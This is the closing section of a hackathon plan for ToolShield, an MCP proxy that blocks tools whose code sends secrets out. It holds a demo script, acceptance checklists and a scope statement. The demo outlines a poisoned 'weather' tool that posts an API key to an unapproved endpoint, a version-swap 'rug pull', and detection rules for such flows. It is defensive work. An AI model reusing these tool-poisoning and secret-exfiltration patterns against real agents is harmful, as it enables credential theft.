### 0:00-0:10 Claim

Show:

```text
weather_plus: "Fetch current weather for a city"
```

Say:

```text
The agent sees a harmless MCP tool description. ToolShield verifies what the implementation can actually access.
```

### 0:10-0:40 Attack and Block

Run malicious weather through the proxy.

Show:

```text
TOOLSHIELD_DEMO_API_KEY
  -> DICT_BUILD
  -> JSON_SERIALIZE
  -> HTTP_POST
  -> unapproved endpoint

BLOCK S001 SECRET_TO_EXTERNAL_NETWORK
target gated-call bytes = 0
target handler count = 0
```

### 0:40-0:58 Benign Allow

Run benign weather.

Show:

```text
ALLOW
target handler count = 1
```

### 0:58-1:18 Review

Run suspicious backup.

Show:

```text
REVIEW undeclared NETWORK_OUTBOUND
reject -> handler count = 0
approve once -> handler count = 1
```

### 1:18-1:40 Rug Pull

Show:

```text
v1 trusted
v2 implementation hash changed
new SECRET -> NETWORK flow
BLOCK S008
```

### 1:40-2:00 Proof and Close

Show tests passing.

Close:

```text
Tool descriptions are claims.
ToolShield verifies implementation evidence before execution.
```

---

## 19. Final Acceptance Checklist

P0 acceptance:

- [ ] LatentCode used for all project code.
- [ ] At least one SkillPatch skill installed and actually used.
- [ ] MCP stdio proxy runs a target server.
- [ ] `tools/list` metadata observed.
- [ ] `tools/call` gated before target write.
- [ ] AST scanner detects malicious weather source-to-sink flow.
- [ ] Policy engine emits ALLOW/REVIEW/BLOCK.
- [ ] BLOCK writes zero gated-call bytes to target.
- [ ] BLOCK leaves target handler count at 0.
- [ ] Benign ALLOW proves the system does not simply block everything.
- [ ] REVIEW reject and approve behaviors work.
- [ ] Full P0 tests pass.
- [ ] Demo can be shown in under 2 minutes.

Submission acceptance:

- [ ] Public or judge-accessible GitHub repository.
- [ ] Demo video maximum 2 minutes.
- [ ] Build in Public link posted during the event and tagging `@LatentForce`.
- [ ] LatentCode `/export` transcript for every contributor who wrote code.
- [ ] Demo video and transcripts in one Google Drive folder.
- [ ] Drive permissions set to "Anyone with the link can view".
- [ ] Drive link tested in private browsing.
- [ ] SkillPatch skill slug named on submission form.
- [ ] Submission completed before Sunday, 30 August 2026, 18:00 IST.

---

## 20. Product Definition Lock

For this hackathon, ToolShield is not a broad MCP security platform. It is a focused, demonstrable implementation-aware MCP execution gate.

Do not trade away the zero-execution proof for polish.

The build is successful if a judge can watch:

```text
harmless tool claim
  -> implementation evidence
  -> secret-to-network flow
  -> BLOCK
  -> target receives zero gated-call bytes
  -> target handler executes zero times
```

That is the product.
